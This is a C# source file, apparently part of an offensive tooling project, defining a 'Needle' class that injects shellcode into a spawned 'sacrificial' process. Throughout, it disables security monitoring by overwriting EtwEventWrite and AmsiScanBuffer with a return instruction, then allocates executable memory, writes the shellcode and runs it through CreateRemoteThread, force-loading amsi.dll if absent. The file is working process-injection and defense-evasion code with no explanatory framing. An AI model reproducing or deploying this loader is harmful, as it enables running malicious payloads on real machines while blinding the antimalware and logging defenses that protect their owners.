using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

using static DemoApp.Sacrificial.Lamb;

namespace DemoApp.Injection
{
    public class Needle
    {
        readonly PROCESS_INFORMATION Pi;
        readonly bool PatchEtw;
        readonly bool PatchAmsi;

        readonly byte[] Patch = new byte[] { 0xC3 };

        public Needle(PROCESS_INFORMATION Pi, bool PatchEtw = true, bool PatchAmsi = true)
        {
            this.Pi = Pi;
            this.PatchEtw = PatchEtw;
            this.PatchAmsi = PatchAmsi;
        }

        public void Inject(byte[] Shellcode)
        {
            if (PatchEtw)
            {
                PatchEtwEventWrite();
            }

            if (PatchAmsi)
            {
                PatchAmsiScanBuffer();
            }

            var memory = VirtualAllocEx(
                Pi.hProcess,
                IntPtr.Zero,
                (uint)Shellcode.Length,
                0x1000 | 0x2000,
                0x40
                );

            WriteProcessMemory(
                Pi.hProcess,
                memory,
                Shellcode,
                (uint)Shellcode.Length,
                out UIntPtr bytesWritten
                );

            CreateRemoteThread(
                Pi.hProcess,
                IntPtr.Zero,
                0,
                memory,
                IntPtr.Zero,
                0,
                IntPtr.Zero
                );
        }

        private void PatchEtwEventWrite()
        {
            var module = LoadLibraryEx("ntdll.dll", IntPtr.Zero, 0);
            var address = GetProcAddress(module, "EtwEventWrite");

            VirtualProtectEx(
                Pi.hProcess,
                address,
                (UIntPtr)Patch.Length,
                0x40,
                out uint flOldProtect
                );

            WriteProcessMemory(
                Pi.hProcess,
                address,
                Patch,
                (uint)Patch.Length,
                out UIntPtr _
                );

            VirtualProtectEx(
                Pi.hProcess,
                address,
                (UIntPtr)Patch.Length,
                flOldProtect,
                out uint _
                );
        }

        private void PatchAmsiScanBuffer()
        {
            var module = LoadLibraryEx("amsi.dll", IntPtr.Zero, 0);
            var address = GetProcAddress(module, "AmsiScanBuffer");

            CheckModuleLoaded("amsi.dll");

            VirtualProtectEx(
                Pi.hProcess,
                address,
                (UIntPtr)Patch.Length,
                0x40,
                out uint flOldProtect
                );

            WriteProcessMemory(
                Pi.hProcess,
                address,
                Patch,
                (uint)Patch.Length,
                out UIntPtr _
                );

            VirtualProtectEx(
                Pi.hProcess,
                address,
                (UIntPtr)Patch.Length,
                flOldProtect,
                out uint _
                );
        }

        private void CheckModuleLoaded(string moduleName, bool loadLib = true)
        {
            var modules = Process.GetProcessById(Pi.dwProcessId).Modules;

            var present = false;

            foreach (ProcessModule module in modules)
            {
                if (module.ModuleName.Equals(moduleName, StringComparison.OrdinalIgnoreCase))
                {
                    present = true;
                    break;
                }
            }

            if (!present && loadLib)
            {
                var encodedModuleName = Encoding.UTF8.GetBytes(moduleName);

                var mem = VirtualAllocEx(
                    Pi.hProcess,
                    IntPtr.Zero,
                    (uint)encodedModuleName.Length,
                    0x1000 | 0x2000,
                    0x40
                    );

                WriteProcessMemory(
                    Pi.hProcess,
                    mem,
                    encodedModuleName,
                    (uint)encodedModuleName.Length,
                    out UIntPtr _
                    );

                var kernel = LoadLibraryEx("kernel32.dll", IntPtr.Zero, 0);
                var loadLibrary = GetProcAddress(kernel, "LoadLibraryA");

                CreateRemoteThread(
                    Pi.hProcess,
                    IntPtr.Zero,
                    0,
                    loadLibrary,
                    mem,
                    0,
                    IntPtr.Zero
                    );
            }
        }

        [DllImport("kernel32.dll")]
        static extern IntPtr LoadLibraryEx(
            string lpFileName,
            IntPtr hReservedNull,
            uint dwFlags
            );

        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(
            IntPtr hModule,
            string procName
            );

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            UIntPtr dwSize,
            uint flNewProtect,
            out uint lpflOldProtect
            );

        [DllImport("kernel32.dll")]
        static extern IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect
            );

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            uint nSize,
            out UIntPtr lpNumberOfBytesWritten
            );

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            IntPtr lpThreadId
            );
    }
}